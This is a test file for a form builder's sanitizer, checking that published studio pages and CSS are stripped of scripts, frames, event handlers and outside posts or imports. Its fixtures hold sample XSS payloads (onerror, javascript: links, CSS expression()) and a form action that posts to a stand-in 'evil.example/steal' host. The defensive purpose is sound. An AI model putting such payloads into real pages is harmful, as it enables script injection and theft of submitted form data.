// Studio forms published as real forms (src/lib/studio/page.ts): the page is cleaned (nothing runs code, posts away,
// or loads a picture other than the logo), its questions become the form's fields, the after-send becomes the
// form's booking with routes, and the checker keeps it all.

import assert from "node:assert/strict";
import { test } from "node:test";
import { checkForm, type Form } from "../src/lib/forms/schema.ts";
import { cleanPage, cleanPageCss, pageForm } from "../src/lib/studio/page.ts";

const HTML = `<div class="page" id="page"><img data-cl-logo alt="Logo" class="logo" src="https://evil.example/x.png" onerror="alert(1)">
<script>alert(1)</script><iframe src="https://evil.example"></iframe>
<form id="f" action="https://evil.example/steal"><section data-cl-step id="s1">
<label for="nm">Your name</label><input id="nm" name="name" data-cl-save="first_name" required>
<label for="em">Work email</label><input id="em" type="email" name="email" data-cl-save="email" required>
<p>Team size</p>
<label class="choice"><input type="radio" name="size" value="1-10" required> Just us</label>
<label class="choice"><input type="radio" name="size" value="51-200"> 51 to 200</label>
<div data-cl-show-if="size == '51-200'"><label>Budget<input name="budget" type="number" required></label></div>
<label>Role<select name="role"><option value="">Pick one</option><option value="cto">CTO</option><option>Founder</option></select></label>
<label><input type="checkbox" name="news"> Send me news</label>
<label><input type="checkbox" name="tools" value="hubspot"> HubSpot</label><label><input type="checkbox" name="tools" value="salesforce"> Salesforce</label>
<a href="javascript:alert(1)">bad</a><a href="https://ok.example/terms">Terms</a>
<button data-cl-next onclick="x()">Next</button><button type="submit">Send</button></section>
<section data-cl-thanks hidden><div data-cl-book id="book"></div></section></form></div>`;

test("the page is cleaned: no scripts, frames, handlers, outside posts or pictures but the logo", () => {
  const { html } = cleanPage(HTML);
  assert.ok(!/<script|<iframe|onerror|onclick|javascript:|action=|evil\.example/i.test(html), html);
  assert.ok(/<img data-cl-logo alt="Logo" class="logo">/.test(html));
  assert.ok(html.includes('<form id="f" novalidate>'));
  assert.ok(html.includes('data-cl-show-if="size == &#39;51-200&#39;"') || html.includes(`data-cl-show-if="size == '51-200'"`));
  assert.ok(html.includes('href="https://ok.example/terms"'));
  assert.ok(html.includes('<button data-cl-next type="button">Next</button>'));
});

test("questions are read with their labels, options and contact fields", () => {
  const { questions } = cleanPage(HTML);
  const by = Object.fromEntries(questions.map((q) => [q.name, q]));
  assert.deepEqual(Object.keys(by), ["name", "email", "size", "budget", "role", "news", "tools"]);
  assert.equal(by.name!.label, "Your name");
  assert.equal(by.name!.save, "first_name");
  assert.equal(by.email!.type, "email");
  assert.deepEqual(by.size!.options, [{ value: "1-10", label: "Just us" }, { value: "51-200", label: "51 to 200" }]);
  assert.equal(by.size!.required, true);
  // Under a show-if: the server doesn't run the page's conditions, so it's never required there.
  assert.equal(by.budget!.required, false);
  assert.equal(by.budget!.label, "Budget");
  // The empty "Pick one" is a placeholder, not an answer.
  assert.deepEqual(by.role!.options.map((o) => o.value), ["cto", "Founder"]);
  assert.equal(by.news!.type, "checkbox");
  assert.equal(by.tools!.type, "multi");
});

test("the page publishes as a form the checker keeps, with its booking and routes", () => {
  const meet = "11111111-1111-4111-8111-111111111111";
  const big = "22222222-2222-4222-8222-222222222222";
  const { form } = pageForm({ html: HTML, css: ".page{background:url(javascript:x)}", brand: "@import url('https://fonts.googleapis.com/css2?family=Nunito');@import url('https://evil.example/x.css');:root{--brand-primary:#58cc02}", after: { kind: "meeting", meeting: meet, routes: [{ field: "size", value: "51-200", meeting: big }] }, title: "Book a demo" });
  const r = checkForm(form);
  assert.ok("form" in r, JSON.stringify("errors" in r ? r.errors : null));
  const f = (r as { form: Form }).form;
  const fields = f.steps[0]!.fields;
  assert.deepEqual(fields.map((x) => [x.key, x.type]), [["first_name", "text"], ["email", "email"], ["q.size", "choice"], ["q.budget", "number"], ["q.role", "dropdown"], ["q.news", "checkbox"], ["q.tools", "multi"]]);
  assert.ok(f.page);
  assert.equal(f.page!.ids.size, "size");
  assert.ok(f.page!.brand.includes("fonts.googleapis.com") && !f.page!.brand.includes("evil.example"));
  assert.ok(!f.page!.css.includes("javascript"));
  assert.equal(f.after.schedule?.tool, "claritia");
  assert.equal(f.after.schedule?.meetingTypeId, meet);
  assert.deepEqual(f.after.schedule?.routes, [{ id: "r1", meet: big, conds: [{ field: "answer.q.size", op: "is", value: "51-200" }] }]);
});

test("a page with no email asks for none, and a page link is kept as the after-send", () => {
  const { form } = pageForm({ html: `<form><input name="mood" required><button type="submit">Go</button></form>`, css: "", brand: "", after: { kind: "page", url: "https://acme.com/thanks" } });
  const r = checkForm(form);
  assert.ok("form" in r);
  const f = (r as { form: Form }).form;
  assert.equal(f.emailOptional, true);
  assert.deepEqual(f.after.end, { kind: "redirect", url: "https://acme.com/thanks" });
});

test("css: closing tags, script urls and outside imports are refused; https fonts and pictures stay", () => {
  const css = cleanPageCss(`</style><script>x</script>.a{background:url(https://cdn.example/a.png)}.b{background:url(data:text/html,x)}.c{width:expression(alert(1))}@import "https://evil.example/a.css";@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700);`);
  assert.ok(!css.includes("</"));
  assert.ok(css.includes("url(https://cdn.example/a.png)"));
  assert.ok(!css.includes("data:text/html"));
  assert.ok(!css.includes("expression("));
  assert.ok(!css.includes("evil.example"));
  assert.ok(css.includes("fonts.googleapis.com/css2?family=Inter:wght@400;700"));
});
